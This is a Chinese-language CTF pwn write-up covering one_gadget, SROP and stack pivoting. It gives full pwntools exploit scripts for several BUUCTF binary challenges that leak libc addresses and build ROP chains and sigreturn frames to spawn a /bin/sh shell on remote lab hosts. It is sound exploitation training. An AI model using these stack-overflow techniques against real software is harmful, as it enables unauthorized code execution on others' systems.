<img width="880" height="485" alt="image" src="https://github.com/user-attachments/assets/b1d9274b-982b-4c3b-bfae-9e7a06d3fd88" />

这个题在 ret2libc 里正常做法，下面是 one_gadget 做法，更加简洁：

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26565
io = remote(host,port)
elf = ELF("./ciscn_2019_c_1")
libc = ELF("./libc-2.27.so")
offset = 0x57
padding = b'\0' + b"A"*offset
pop_rdi_ret = 0x400c83
ret = 0x400c84
encrypt = 0x4009A0
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload_1 = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt)

def main():
    io.recvuntil(b"Input your choice!\n")
    io.sendline(b"1")
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_1)
    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))    
    print(hex(puts_addr))   # 0x7f32720c99c0 → libc6_2.27-3ubuntu1_amd64
    libc_base = puts_addr - libc.sym['puts']
    one_gadget_offset = 0x4f322
    one_gadget = libc_base + one_gadget_offset
    payload_2 = b'\0' + b'A'*offset + p64(one_gadget)
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_2)
    io.interactive()
    
if __name__ == "__main__":
    main()


# └─$ one_gadget libc-2.27.so
# 0x4f2be execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   address rsp+0x50 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   address rsp+0x50 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```


## SROP

当我们做 ROP 题目时，偶尔发现找 `pop rdi; ret` 很容易，但是找 `pop rdx; ret` 往往不简单。

如果题目可用的 gadget 少的可怜，我们传统的 ROP 就不可用了，需要考虑 SROP。

SROP (Sigreturn Oriented Programming) 是一种非常强大 ROP 的变种，它使一次性控制所有的 CPU 寄存器成为可能。

### Unix 的 signal 处理

在 unix 和 linux 中，当进程收到一个信号，内核会暂停当前程序的执行，转而去执行信号处理函数。

在这个“上下文切换”的过程中，内核为了保证处理完信号后能恢复原状，会把当前 CPU 里所有的寄存器状态（rax, rdi, rsi, rip, rsp 等等）一股脑地全部压入栈中。

这块保存在栈上的数据结构，被称为 Signal Frame（信号帧）。

当信号处理函数执行完毕后，程序会调用一个特殊的系统调用：`sys_sigreturn`，从栈上把那个 Signal Frame 里的数据原封不动地弹回各个寄存器中，恢复现场。

### 攻击步骤

**`sys_sigreturn` 会盲目地相信栈上的数据，并把它们塞进寄存器。**

首先 `syscall` 会检查 rax 所存储的系统调用号，比如当 `rax = 1` 执行 `sys_write`，当 `rax = 15` 执行 `sys_sigreturn`，当 `rax = 59` 执行 `execve`。

所以我们只需要在 rsp 指向的地方 syscall_ret，并在下一个放 sig frame，就可以 SROP 劫持所有的寄存器。

形如：

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `-0x20` | `syscall` | `<- rsp` |
| `-0x28` | `frame1` |  |
| `.....` |  |  |

值得一提的是，sigframe 的长度在 64 位系统中，pwntools 默认是 0xF8，并且 sigframe 的前几个字节覆盖也不会对 SROP 的实际效果产生影响，它的前 8 个字符通常是 `uc_flags`，具体是什么不用管，总之执行 SROP 时不检查它。

在攻击中，我们最后的目的往往是使得

```
	frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh_addr
    frame2.rsi = 0
    frame2.rdx = 0
#   frame2.rsp = 
#	frame2.rbp = 
    frame2.rip = syscall_ret
```

需要注意的是，我们的 frame.rip 必须指向 syscall 所在的某个地址，但是关于 `syscall` 与 `syscall;ret` 之间的选择，即如果只是执行 `sys_write` 之类的，后面还要继续 ROP 的，那就要选 `syscall;ret`，而直接 getshell 的则是两种皆可。

能够正确执行，其中难点在于找到 binsh_addr，为了使得 binsh 被写在栈的一个确定的位置，我们通常有几个方案：

* 方案 1 ：第一次 SROP 把栈强行迁移到固定地址的 bss 段（NO PIE）
* 方案 2 ：先泄露栈上的某个地址，然后动态调试得到 rsp 到泄露的栈的地址的偏移（通常本机和远端的偏移有一定差距）
* 方案 3 ：先泄露栈上的某个地址，然后栈迁移使 binsh 被写在一个确定的位置。

#### 例题 1：ciscn_2019_s_3

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)

这道题如果以 ret2libc 的思路做几乎和 jarvisoj_level3_x64 差不多，但是没有 `write_got`，所以不可行。

附带了一个 `syscall`。

<img width="678" height="252" alt="image" src="https://github.com/user-attachments/assets/e5122b50-4283-43c0-a9db-65719e4f46c7" />

然后看一个 `gadgets()` 函数里有 `mov rax 15`，也就是 `sigreturn`。

<img width="626" height="241" alt="image" src="https://github.com/user-attachments/assets/31441132-783f-41b6-a07a-c7bcb0d6d985" />

`sub_4004E2()` 函数里有 `mov rax 59`，也就是 `execve`。

<img width="586" height="171" alt="image" src="https://github.com/user-attachments/assets/785829cb-5ef8-4c56-b983-3803e09b31aa" />

那么我们就可以用 SROP。

如果我们用动态调试找一下 rsp 到泄露的栈的偏移，会发现 wsl 应该是 0x148，远端却是 0x110。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28445
io = remote(host,port)
# io = process("./ciscn_s_3")
elf = ELF("./ciscn_s_3")
vuln_addr = 0x4004ed
syscall = 0x400517
mov_rax_15_ret = 0x4004da

payload_1 = b'/bin/sh\x00' + b'A'*8 + p64(vuln_addr)
# 没有 pop rbp 直接 retn，所以 padding 长度为 0x10

def main():
    io.sendline(payload_1)
    # gdb.attach(io,"b *0x400517\nc")    # vuln 函数中执行 syscall 的指令地址
    # pause()
    io.recv(0x20)   # payload_1 + saved_rbp
    stack_leak = u64(io.recv(8))  # 泄露的栈上的地址
    binsh = stack_leak - 0x118    # 本地 0x148，靶机通常在 0x110 左右
    frame = SigreturnFrame()
    frame.rax = 59              # sys_execve
    frame.rdi = binsh           # 指向 /bin/sh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall         # 恢复现场后，去执行 syscall
    payload_2 = b'/bin/sh\x00' + b'A'*8 + p64(mov_rax_15_ret) + p64(syscall) + bytes(frame)
    io.sendline(payload_2)
    io.interactive()


if __name__ == "__main__":
    main()
```

当然我们也可以把栈强行迁移到固定的 bss 段上。

```
# written by Sonnety
from pwn import *
context(os='linux', arch='amd64', log_level='debug')


# io = remote("node.buuoj.cn", 12345)
io = process("./ciscn_s_3")
elf = ELF("./ciscn_s_3")
bss_addr = elf.bss() + 0x500 

mov_rax_15_ret = 0x4004DA   # sigreturn
syscall_ret = 0x400517

def main():
    frame1 = SigreturnFrame()
    frame1.rax = constants.SYS_read
    frame1.rdi = 0
    frame1.rsi = bss_addr
    frame1.rdx = 0x400
    frame1.rsp = bss_addr
    frame1.rip = syscall_ret

    payload_1 = b'A' * 0x10 + p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(frame1)
    io.send(payload_1)
    # 此时 rsp 指向我们设定的 bss 段    
    io.recv(0x30)   # 程序会执行原本的 sys_write 吐出 0x30 字节垃圾数据，无视它
    sleep(0.1)

    binsh_addr = bss_addr + 0x108
    
    frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh_addr
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_ret
    
    payload_2 = p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(frame2)
    payload_2 = payload_2.ljust(0x108, b'\x00') + b'/bin/sh\x00'
    
    io.send(payload_2)
    
    io.interactive()

if __name__ == "__main__":
    main()
```


#### 例题 2：360chunqiu2017_smallest

[BUU CTF 题目链接](https://buuoj.cn/challenges#360chunqiu2017_smallest)

64位程序，只开启了NX保护，程序非常简单，纯纯毛坯房，没有 bss 段。

<img width="1087" height="197" alt="image" src="https://github.com/user-attachments/assets/387bd309-de16-4c44-bc64-2f026f7bdbd2" />

tips：`read()`会返回读入字符的长度，而程序在调用 call 之后的返回值一般是保存在rax中的，所以我们可以通过执行 read 之后的读入的字符长度，来控制 rax 的值。

Phase 1：泄露栈地址

`payload_1 = p64(start) * 3`

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x0` | `start` | `<- ret` |
| `0x8` | `start` |  |
| `0x10` | `start` |  |

第一次读入结束，ret start 再读入，rsp 下移 8 位。

`payload_2 = '\xB3', rax=1 (sys.write)`

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x8` | `0x4000B3` | `<- ret` |
| `0x10` | `0x4000B0` |  |

第二次读入结束，ret 0x4000B3，rsp 下移 8 位，跳过了 `xor     rax, rax`，直到执行到 syscall：

`edx = 0x400, rsi = rsp, rdi = rax = 1`
syscall 执行 `sys.write(1, rsp, 0x400)`

此时输出的前 8 个字节是 0x10 处的 0x4000B0，第 9 到 16 个字节是 0x18 处的栈地址，记为 stack_addr.

---

Phase 2：第一次 SROP (准备栈迁移)

ret start再读入，rsp下移 8位。

`payload_3 = p64(start) + b'A'*8 + bytes(frame1)`

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x18` | `0x4000B0` | `<- ret` |
| `0x20` | `AAAAAAAA` |  |
| `0x28` | `frame1` |  |
| `.....` |  |  |

这里填 8 个 A 给 syscall 留位置，方便下一次输入 15 个字符，使 `rax = 15` 执行 sigreturn。

---

Phase 3：触发第一次 SROP

ret start再读入，rsp 下移 8 位指向 `0x20`。

`sigreturn = p64(syscall_ret) + b'\x00'*7`, `rax=15`, 触发 sigreturn.

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x20` | `syscall` | `<- rsp` |
| `0x28` | `frame1` |  |
| `.....` |  |  |

*(frame1 前 7 个字节被覆盖为 `\x00`，但不影响).*
```
	frame1 = SigreturnFrame()
    frame1.rax = constants.SYS_read
    frame1.rdi = 0
    frame1.rsi = stack_addr
    frame1.rdx = 0x400
    frame1.rsp = stack_addr
    frame1.rip = syscall_ret
```
---

Phase 4 & 5：在受控栈上构造第二次 SROP

触发 sigreturn 后，rsp 被改为 stack_addr，并执行 `read(0, stack_addr, 0x400)`

这样我们 binsh 所写的位置就已知并且可控了。

```
	frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh_addr
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_ret
```


`payload_4 = p64(start) + b'B'*8 + bytes(frame2)`

`payload_4 = payload_4.ljust(0x300, b'\x00') + b'/bin/sh\x00'`

`binsh = stack_addr + 0x300`

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `stack_addr` | `0x4000B0` |  |
| `stack_addr + 0x08` | `BBBBBBBB` |  |
| `stack_addr + 0x10` | `sigframe` |  |
| `.....` | `00000000` |  |
| `stack_addr + 0x300` | `/bin/sh` |  |

---


最后再 ret start 重新读入，rsp 向下移 8 位，`sigreturn = p64(syscall_ret) + b'\x00'*7` 执行 execve。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 27847
io = remote(host,port)
# io = process("./smallest")
start = 0x4000B0
syscall_ret = 0x4000BE


def main():
    payload_1 = p64(start)*3
    io.send(payload_1)
    sleep(0.1)
    
    payload_2 = b'\xB3'         # 跳过 rax xor rax,并使 rax = 1
    # 执行 mov rdi,rax 后 ,rdi = 1(stdout)
    io.send(payload_2)
    # 执行 syscall，变成 sys_write(1,rsp,0x400)
    leak_data = io.recv(0x400)
    stack_addr = u64(leak_data[8:16]) # 前八个字节是我们填入的 start
    stack_addr = stack_addr - 0x2000        # 内存过高，防止越界，向下放一点
    print(hex(stack_addr))
    frame1 = SigreturnFrame()
    frame1.rax = constants.SYS_read
    frame1.rdi = 0
    frame1.rsi = stack_addr
    frame1.rdx = 0x400
    frame1.rsp = stack_addr
    frame1.rip = syscall_ret

    payload_3 = p64(start) + b'A'*8 + bytes(frame1)
    io.send(payload_3)
    sleep(0.1)

    sigreturn = p64(syscall_ret) + b'\x00'*7
    io.send(sigreturn)
    sleep(0.1)

    binsh = stack_addr + 0x300
    frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_ret

    payload_4 = p64(start) + b'B'*8 + bytes(frame2)
    payload_4 = payload_4.ljust(0x300,b'\x00') + b'/bin/sh\x00'
    io.send(payload_4)
    sleep(0.1)
    io.send(sigreturn)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 3：rootersctf_2019_srop

[BUU CTF 题目链接](https://buuoj.cn/challenges#rootersctf_2019_srop)

找一下能劫持 rax 的 gadget。

<img width="1088" height="121" alt="image" src="https://github.com/user-attachments/assets/ae3e1fff-0860-4c64-8ef1-998bc30e4a21" />

这里有一个 `pop rax;syscall;leave;ret`，`pop rax;syscall` 很好解决，在 payload 后面接一个 15 就可以启动 sigreturn。

但是 `leave` 会销毁当前栈，也就是 `mov rsp,rbp` + `pop rbp`，把 rbp 赋值给 rsp，old rbp 赋值给 rbp。

而 `ret` 则会 `pop rip`，如果我们没有劫持 rbp，此时 rsp 指向了 0x0，就会引发错误。

因此第一次 SROP 应该设置一个安全的栈底。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28172
io = remote(host,port)
# io = process("./rootersctf_2019_srop")
data = 0x402000
syscall_lea_ret = 0x401033
pop_rax_syscall_lea_ret = 0x401032

def main():
    io.recvuntil(b"Hey, can i get some feedback for the CTF?\n")
    frame1 = SigreturnFrame()
    frame1.rax = constants.SYS_read
    frame1.rdi = 0   # stdin
    frame1.rsi = data
    frame1.rdx = 0x400
    frame1.rbp = data + 0x80
    frame1.rsp = data + 0x300
    frame1.rip = syscall_lea_ret
    payload_1 = b'A'*0x88 + p64(pop_rax_syscall_lea_ret) + p64(15) + bytes(frame1)
    io.send(payload_1)
    frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = data
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_lea_ret
    payload_2 = b"/bin/sh\x00"
    payload_2 = payload_2.ljust(0x80,b'\x00')
    payload_2 += b'B'*8 + p64(pop_rax_syscall_lea_ret) + p64(15) + bytes(frame2)    
    io.send(payload_2)
    io.interactive()


if __name__ == "__main__":
    main()
```

## 栈迁移

在常规的栈溢出攻击中，通常会在覆盖了 ret 之后，继续写入长长的一串 ROP 链（比如用来泄露 libc 然后拿 shell）。

但是当程序只给非常微小的溢出空间时，比如，输入缓冲区的溢出限制非常严格，只能刚好覆盖掉 ebp 和紧挨着的 ret（0x10）。

迁移正是为了解决这个问题而诞生的。

既然当前的栈空间不够，那我们就把栈顶指针（ESP/RSP）挪到另一个我们能控制、且空间足够大的内存区域（如 bss 段），去那里执行 ROP 链。

### 实现原理

在上一道 SROP 的题目中提到 `leave;ret` 等效于 `mov rsp,rbp;pop rbp;pop rip;jmp rip`，这里细化一下具体栈销毁流程。

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x0` | `padding` |  |
| `0x8` | `padding` |  |
| `0x10` | `padding` |  |
| `0x18` | `old rbp` | 父函数rbp |
| `0x20` | `rip address` | 函数调用结束后的下一条指令 |

执行流要执行 leave 时，rsp 从原本的 0x0 位置跳到了 0x18 这个位置来，而中间的 padding 则被视为销毁。

紧接着 pop rbp 则弹出了 old rbp 赋值给 rbp，恢复了父函数的 rbp，rsp 下移 8 位。

下一步 pop rip 把函数调用后的下一条指令弹出给了 rip，最后函数返回父函数，子函数被销毁，最后状态恢复成了进子函数时的状态。

对于栈迁移：

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x0` | `padding` |  |
| `0x8` | `padding` |  |
| `0x10` | `padding` |  |
| `0x18` | `.bss address` | 伪造的栈地址 |
| `0x20` | `下一个 leave;ret` |  |

执行流执行 leave 时，销毁 padding，rbp 迁移到 bss 段上。

执行流执行 ret 时，跳到下一个 `leave;ret` 上。

此时，rsp 指向 0x28，rbp 指向 bss 段指定位置。

下一个 leave，将 rbp 赋值给 rsp，**此时 rsp 也被强制迁移到了伪造的栈地址上**。

假设我们在这个伪造的栈地址上已经放好了一些东西。

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x80` | `无用数据` | 头部，最初rbp迁移到这里 |
| `0x88` | `pop rdi;ret` |  |
| `0x90` | `/bin/sh\x00` |  |
| `0x98` | `system` |  |

那么 pop rbp 会把头部的无用数据弹出给 rbp，**很可能这样的数据是无意义的甚至是一个不可读写的非法地址**，不过不用管。

接着就是正常的 rop 链了。

#### 例题 1：ciscn_2019_es_2

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_es_2)

这道题给了两个 printf，可以泄露栈。

<img width="2559" height="937" alt="image" src="https://github.com/user-attachments/assets/55c7a5dd-d58b-41e7-8f9a-06804323718c" />

溢出给了 8 个字节，刚好够覆盖 ebp 和 eip。

所以第一次 printf 肯定是泄露栈，然后 gdb 调试一下，找一下泄露的栈到输入的 ebp 的偏移。

<img width="1746" height="851" alt="900f5a51aa2e6d0e8e2ad953bd8cfc25" src="https://github.com/user-attachments/assets/33758e9d-9426-4889-a52d-e5ce6997442f" />

偏移是 0x38。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 29114
io = remote(host,port)
# io = process('./ciscn_2019_es_2')
elf = ELF('./ciscn_2019_es_2')
system = elf.plt['system']
leave_ret = 0x8048562
payload_1 = b'A'*0x24 + b"meow"

def main():
    io.recvuntil(b"Welcome, my friend. What's your name?\n")
    io.send(payload_1)
    io.recvuntil(b"meow")
    leak_data = io.recvn(4)
    leak_ebp = u32(leak_data)
    print("Leaked EBP:", hex(leak_ebp))     # Leaked EBP: 0xffe14708
    # gdb.attach(io)                        # 0xffe146d0
    ebp = leak_ebp - 0x38
    binsh = ebp + 0x10
    payload_2 = b'A'*4 + p32(system) + p32(0) + p32(binsh) + b"/bin/sh\x00"
    payload_2 = payload_2.ljust(0x28,b"\x00")
    payload_2 = payload_2 + p32(ebp) + p32(leave_ret)
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：[Black Watch 入群题]PWN

[BUU CTF 题目链接](https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN)

<img width="2558" height="641" alt="image" src="https://github.com/user-attachments/assets/125ac065-5df5-4fcc-80d6-b1b353cf99f7" />

发现这个题有一个全局变量 s 可以写入，它写在 bss 段上，没有开 PIE，地址固定。

<img width="2550" height="1002" alt="image" src="https://github.com/user-attachments/assets/210723ec-2a78-41e5-97c3-ea535c87461f" />

于是我们可以考虑把 ROP 链写在 s 上，然而发现并没有 system。

所以考虑第一次栈迁移，泄露 write 以 ret2libc，然后返回 main 函数，第二次栈迁移 getshell。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 26018
io = remote(host,port)
# io = process("./spwn")
elf = ELF("./spwn")
libc = ELF("./libc-2.23.so")
main_addr = 0x8048513
bss = 0x804A300
write_plt = elf.plt['write']
write_got = elf.got['write']
vuln = 0x804849B
leave_ret = 0x8048511

def main():
    io.recvuntil(b"Hello good Ctfer!\n")
    io.recvuntil(b"What is your name?")
    payload_1 = b"meow" + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x400)
    io.send(payload_1)
    io.recvuntil(b"What do you want to say?")
    go_bss = b'A'*0x18 + p32(bss) + p32(leave_ret)
    io.send(go_bss)
    leak_data = io.recvn(4)
    write_addr = u32(leak_data)
    print(hex(write_addr))      # 0xf7e8fb50
    io.recvuntil(b"Hello good Ctfer!\n")
    io.recvuntil(b"What is your name?")
    libc_base = write_addr - libc.sym['write']
    system = libc_base + libc.sym['system']
    binsh = bss + 0x10
    payload_2 = b"meow" + p32(system) + p32(0) + p32(binsh) + b"/bin/sh\x00"
    io.send(payload_2)
    # gdb.attach(io)
    io.recvuntil(b"What do you want to say?")
    io.send(go_bss)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 3：gyctf_2020_borrowstack

[BUU CTF 题目链接](https://buuoj.cn/challenges#gyctf_2020_borrowstack)

最初我认为她很普通。

总之看起来和上一道题差不多，只不过上一道题是先输入到 bss 段，然后再触发栈溢出。

这道题是先栈溢出，然后再输入到 bss 段，不过这一点其实没什么差别，栈溢出与栈偏移不是输入就即刻发生的，而是遇到 ret 之后再发生的。

然而看她的 bss 段，`.bss:0000000000601080 ??                                bank db    ? ;` 其实离上面的 got 表一类不可写数据挺近的，考虑到栈向低地址生长，执行 system 或 puts 时会申请大量局部变量，可能跑到 got 上，所以我们必须先垫几个 ret 把 bss 抬高。

```
payload2 = p64(ret_addr)*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)         # ret 即 pop rip，将 rsp 抬高，放置访问到 got 表等不可写信息
```

然后我就 ROP 了半天，死活也不能打通 system，最后找了找题解，发现可以用 onegadget 就过了，怀疑是因为 system 会开非常多的局部变量，如果在 bss 段再次进行一次 ROP，那么 rsp 就会跑到 got 上去，导致错误。

但是如果我们在 main 函数进行 onegadget，虽然 main 函数只有 8 的溢出空间，不能 ROP，但是 main 在真实栈上，有几 MB 的深度，所以可以执行。

```
# Based on writeup provided by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

# io = process("./gyctf_2020_borrowstack")
io = remote('node5.buuoj.cn', 26496)
elf = ELF("./gyctf_2020_borrowstack")
libc = ELF("./libc.so")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
leave_ret = 0x400699
bank_addr = 0x601080
pop_rdi_ret = 0x400703
ret_addr = 0x400704
main_addr = 0x400626

def main():
    io.recvuntil(b"want\n")
    
    payload_1 = b'a' * 0x60 + p64(bank_addr) + p64(leave_ret)
    io.send(payload_1)
    io.recvuntil(b"Done!You can check and use your borrow stack now!\n")

    payload2 = p64(ret_addr)*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)         # ret 即 pop rip，将 rsp 抬高，放置访问到 got 表等不可写信息
    io.send(payload2)
    leak_data = io.recvline().strip(b'\n')
    puts_addr = u64(leak_data.ljust(8,b'\x00'))
    print("\n[+] Leak puts:",hex(puts_addr))
    libc_base = puts_addr - libc.sym['puts']
    one_gadget_offset = 0x4526a 
    one_gadget = libc_base + one_gadget_offset
    print("\n[+] Libc Base:", hex(libc_base))
    print("\n[+] One Gadget:", hex(one_gadget))
    
    io.recvuntil(b"want\n")
    payload3 = b'a' * 0x60 + p64(0) + p64(one_gadget)
    io.send(payload3)
    io.recvuntil(b"Done!You can check and use your borrow stack now!\n")
    io.send(b'1') # 随便塞个字符让 read 返回，从而让 main 函数走到结尾触发 shell   
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 4：actf_2019_babystack

[BUU CTF 题目链接](https://buuoj.cn/challenges#actf_2019_babystack)

<img width="2556" height="970" alt="image" src="https://github.com/user-attachments/assets/65c005a8-f2a2-4b41-aa70-f80fef5ced3b" />

大概意思就是，程序运行时会倒数 0x3C 秒，在这个时间内要 getshell。

第一个问你输入的大小，不允许超过 0xE0，而 padding 大小 0xD0，明显栈溢出。

依旧没有 system，要先 ret2libc。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
# context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 26174
io = remote(host,port)
# io = process("./ACTF_2019_babystack")
elf = ELF("./ACTF_2019_babystack")
libc = ELF("./libc-2.27.so")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
leave_ret = 0x400a18
pop_rdi_ret = 0x400ad3
ret = 0x400ad4
main_addr = 0x4008F6

def main():
    io.recvuntil(b"Welcome to ACTF's babystack!\n")
    io.recvuntil(b"How many bytes of your message?\n")
    io.sendline(b"224")     # 0xE0
   # gdb.attach(io)
    io.recvuntil(b">Your message will be saved at ")
    leak_data = io.recvline().strip(b'\n')
    leak_stack = int(leak_data,16)
    print("\n[+]Leak stack:",hex(leak_stack))
    io.recvuntil(b"What is the content of your message?\n")
    io.recvuntil(b">")
    payload_1 = b'A'*0xA0 + b'B'*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr) 
    payload_1 = payload_1.ljust(0xD0,b'\x00')
    payload_1 += p64(leak_stack + 0xA0) + p64(leave_ret)
    
    # gdb.attach(io)
    # pause()
    io.send(payload_1)
    io.recvuntil(b"Byebye~\n")
    leak_data = io.recvline().strip(b'\n')
    leak_data = leak_data.ljust(8,b"\x00")
    puts_addr = u64(leak_data)
    print("\n[+]Leak puts:",hex(puts_addr))
    libc_base = puts_addr - libc.sym['puts']
    print("\n[+]Leak libcbase:",hex(libc_base))
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    io.recvuntil(b"Welcome to ACTF's babystack!\n")
    io.recvuntil(b"How many bytes of your message?\n")
    io.sendline(b"224")     # 0xE0
    io.recvuntil(b">Your message will be saved at ")
    leak_data = io.recvline().strip(b'\n')
    leak_stack = int(leak_data,16)
    print("\n[+]Leak stack:",hex(leak_stack))
    io.recvuntil(b"What is the content of your message?\n")
    io.recvuntil(b">")
    payload_2 = b'A'*0xA0 + b'B'*0x8 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0) 
    payload_2 = payload_2.ljust(0xD0,b'\x00')
    payload_2 += p64(leak_stack + 0xA0) + p64(leave_ret)
    # gdb.attach(io)
    # pause()
    io.send(payload_2)
    io.interactive()


if __name__ == "__main__":
    main()

```

